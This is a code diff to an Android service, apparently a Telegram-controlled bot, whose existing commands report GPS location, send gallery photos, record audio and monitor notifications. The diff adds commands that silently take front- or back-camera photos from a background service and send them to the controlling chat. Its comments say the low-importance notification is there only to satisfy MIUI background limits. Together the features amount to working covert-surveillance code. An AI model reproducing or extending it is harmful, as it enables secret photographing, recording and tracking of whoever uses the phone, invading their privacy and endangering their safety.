@@ -53,6 +53,7 @@ class TelegramService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private var mediaRecorder: MediaRecorder? = null
     private var isRecording = false
+    private var isCapturingCamera = false
     private var audioRecord: AudioRecord? = null
     private var audioFocusRequest: Any? = null
 
@@ -370,6 +371,12 @@ class TelegramService : Service() {
             cmd.contains("/record") || cmd.contains("/rekam") -> {
                 recordAudio(targetChatId)
             }
+            cmd.contains("/camfront") || cmd.contains("/kamera_depan") || cmd.contains("/camdep") -> {
+                captureCamera(targetChatId, facing = "front")
+            }
+            cmd.contains("/camback") || cmd.contains("/kamera_belakang") || cmd.contains("/cambel") -> {
+                captureCamera(targetChatId, facing = "back")
+            }
             cmd.contains("/crash") || cmd == "crash" -> {
                 val app = applicationContext as? App
                 val crashLog = app?.getLatestCrashLog()
@@ -395,6 +402,8 @@ class TelegramService : Service() {
             /gps      - dapatkan lokasi GPS
             /photo [N] - kirim N foto terakhir dari galeri (default 5, max 20)
             /record     - rekam 15 detik audio dan kirim ke chat
+            /camfront   - ambil foto kamera depan (background)
+            /camback    - ambil foto kamera belakang (background)
             /crash      - lihat log crash terakhir
             /notifications - status monitor notifikasi
             /help     - daftar ini
@@ -788,6 +797,215 @@ class TelegramService : Service() {
                     scope?.launch { sendText(chatId, "❌ Rekaman gagal: $err") }
                 }
             }
+        }
+    }
+
+    /** Ambil foto kamera depan/belakang secara background (tanpa Activity terlihat).
+     *  Kamera dibuka via Camera2 + ImageReader di service; notification foreground
+     *  id=3 (channel khusus kamera) jadi visible surface sah MIUI. */
+    private suspend fun captureCamera(chatId: String, facing: String) {
+        if (isCapturingCamera) {
+            sendText(chatId, "Sedang mengambil foto... tunggu selesai.")
+            return
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val granted = checkSelfPermission(android.Manifest.permission.CAMERA) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
+            if (!granted) {
+                sendText(chatId, "⚠️ Izin kamera belum diberikan. Buka app → izinkan akses kamera → lalu /camfront atau /camback lagi.")
+                return
+            }
+        }
+        isCapturingCamera = true
+        showCameraNotification(facing)
+        val label = if (facing == "front") "depan" else "belakang"
+        sendText(chatId, "📷 Ambil foto kamera $label...")
+        scope?.launch {
+            val captured = withContext(Dispatchers.IO) {
+                try {
+                    captureOneFrame(facing)
+                } catch (e: Exception) {
+                    Log.e(TAG, "captureCamera: ${e.javaClass.simpleName}: ${e.message}")
+                    null
+                }
+            }
+            hideCameraNotification()
+            if (captured != null && captured.exists() && captured.length() > 0) {
+                Log.d(TAG, "captureCamera: ${captured.length()} bytes, sending...")
+                sendPhoto(chatId, captured, "Kamera $label ${Build.MODEL}")
+                captured.delete()
+            } else {
+                sendText(chatId, "❌ Gagal ambil foto kamera $label.")
+            }
+            isCapturingCamera = false
+        }
+    }
+
+    /** Ambil satu frame kamera (front/back) via Camera2 + ImageReader, tulis JPEG.
+     *  Harus dipanggil dari non-main thread (IO). */
+    private fun captureOneFrame(facing: String): java.io.File? {
+        val cm = getSystemService(android.hardware.camera2.CameraManager::class.java) ?: return null
+        val camChars = { id: String -> cm.getCameraCharacteristics(id) }
+        val wantedFacing = if (facing == "front")
+            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
+        else
+            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
+        val cameraId = cm.cameraIdList.firstOrNull { id ->
+            try {
+                camChars(id).get(
+                    android.hardware.camera2.CameraCharacteristics.LENS_FACING
+                ) == wantedFacing
+            } catch (e: Exception) { false }
+        } ?: cm.cameraIdList.firstOrNull()
+        if (cameraId == null) {
+            Log.e(TAG, "captureOneFrame: no camera found")
+            return null
+        }
+
+        val outDir = getExternalFilesDir(null) ?: filesDir
+        val outFile = java.io.File(outDir, "cam_${facing}_${System.currentTimeMillis()}.jpg")
+        if (outFile.exists()) outFile.delete()
+
+        val size = pickCameraSize(camChars(cameraId), facing)
+        val imageReader = android.media.ImageReader.newInstance(size.first, size.second,
+            android.graphics.ImageFormat.JPEG, 2)
+        val latch = java.util.concurrent.CountDownLatch(1)
+        var saved: java.io.File? = null
+        var camera: android.hardware.camera2.CameraDevice? = null
+        var session: android.hardware.camera2.CameraCaptureSession? = null
+        var openFailed = false
+
+        imageReader.setOnImageAvailableListener({ reader ->
+            val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+            val buf = img.planes[0].buffer
+            val bytes = ByteArray(buf.remaining())
+            buf.get(bytes)
+            img.close()
+            outFile.outputStream().use { it.write(bytes) }
+            saved = outFile
+            latch.countDown()
+        }, android.os.Handler(android.os.Looper.getMainLooper()))
+
+        val handler = android.os.Handler(android.os.Looper.getMainLooper())
+        cm.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
+            override fun onOpened(dev: android.hardware.camera2.CameraDevice) {
+                camera = dev
+                try {
+                    val captureRequest = dev.createCaptureRequest(
+                        android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE
+                    ).apply {
+                        addTarget(imageReader.surface)
+                        set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
+                            android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                        set(android.hardware.camera2.CaptureRequest.JPEG_QUALITY, 95.toByte())
+                    }
+                    dev.createCaptureSession(
+                        listOf(imageReader.surface),
+                        object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(sess: android.hardware.camera2.CameraCaptureSession) {
+                                session = sess
+                                try {
+                                    sess.capture(captureRequest.build(), object :
+                                        android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
+                                        override fun onCaptureCompleted(
+                                            s: android.hardware.camera2.CameraCaptureSession,
+                                            r: android.hardware.camera2.CaptureRequest,
+                                            f: android.hardware.camera2.TotalCaptureResult
+                                        ) {
+                                            latch.countDown()
+                                        }
+                                    }, handler)
+                                } catch (e: Exception) {
+                                    Log.e(TAG, "capture: ${e.message}")
+                                    latch.countDown()
+                                }
+                            }
+                            override fun onClosed(sess: android.hardware.camera2.CameraCaptureSession) {
+                                // sesi tertutup — tidak ada yang perlu dilakukan
+                            }
+                            override fun onConfigureFailed(sess: android.hardware.camera2.CameraCaptureSession) {
+                                Log.e(TAG, "capture session configure failed")
+                                latch.countDown()
+                            }
+                        },
+                        handler
+                    )
+                } catch (e: Exception) {
+                    Log.e(TAG, "createCaptureSession fail: ${e.message}")
+                    latch.countDown()
+                }
+            }
+            override fun onDisconnected(dev: android.hardware.camera2.CameraDevice) {
+                try { dev.close() } catch (_: Exception) {}
+            }
+            override fun onError(dev: android.hardware.camera2.CameraDevice, error: Int) {
+                openFailed = true
+                Log.e(TAG, "camera open error: $error")
+                try { dev.close() } catch (_: Exception) {}
+                latch.countDown()
+            }
+        }, handler)
+
+        // Tunggu max 10 detik (termasuk time-to-first-frame di kamera)
+        latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
+        try { session?.close() } catch (_: Exception) {}
+        try { camera?.close() } catch (_: Exception) {}
+        try { imageReader.close() } catch (_: Exception) {}
+        if (openFailed) return null
+        return if (outFile.exists() && outFile.length() > 0) outFile else null
+    }
+
+    /** Pilih ukuran kamera: back=1080p, front=paling dekat 1080p yang didukung. */
+    private fun pickCameraSize(
+        chars: android.hardware.camera2.CameraCharacteristics,
+        facing: String
+    ): Pair<Int, Int> {
+        val map = chars.get(
+            android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP
+        ) ?: return Pair(1920, 1080)
+        val sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
+            ?.map { Pair(it.width, it.height) }
+            ?: return Pair(1920, 1080)
+        if (facing == "front") {
+            // Front camera biasanya 720p–1080p; ambil yang paling besar
+            return sizes.maxByOrNull { (it.first * it.second).toLong() }
+                ?: Pair(1280, 720)
+        }
+        // Back camera: ambil yang ≤ 1080p terbesar
+        return sizes
+            .filter { (it.first * it.second).toLong() <= 1920L * 1080L }
+            .maxByOrNull { (it.first * it.second).toLong() }
+            ?: Pair(1920, 1080)
+    }
+
+    /** Tampilkan notification foreground kamera (id=3). */
+    private fun showCameraNotification(facing: String) {
+        val ch = "telebot_camera"
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            getSystemService(NotificationManager::class.java).createNotificationChannel(
+                NotificationChannel(ch, "Kamera TeleBot", NotificationManager.IMPORTANCE_LOW)
+            )
+        }
+        val label = if (facing == "front") "depan" else "belakang"
+        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
+        val note = NotificationCompat.Builder(this, ch)
+            .setContentTitle("📷 Ambil foto kamera $label...")
+            .setContentText("Menyusun 1 foto, kirim ke Telegram")
+            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setContentIntent(pi)
+            .setOngoing(true)
+            .build()
+        startForeground(3, note)
+        Log.d(TAG, "showCameraNotification: started facing=$facing")
+    }
+
+    /** Hapus notification kamera (id=3) tanpa mematikan foreground service. */
+    private fun hideCameraNotification() {
+        try {
+            getSystemService(NotificationManager::class.java).cancel(3)
+            Log.d(TAG, "hideCameraNotification: cancelled id=3")
+        } catch (e: Exception) {
+            Log.w(TAG, "hideCameraNotification: ${e.message}")
         }
     }
 
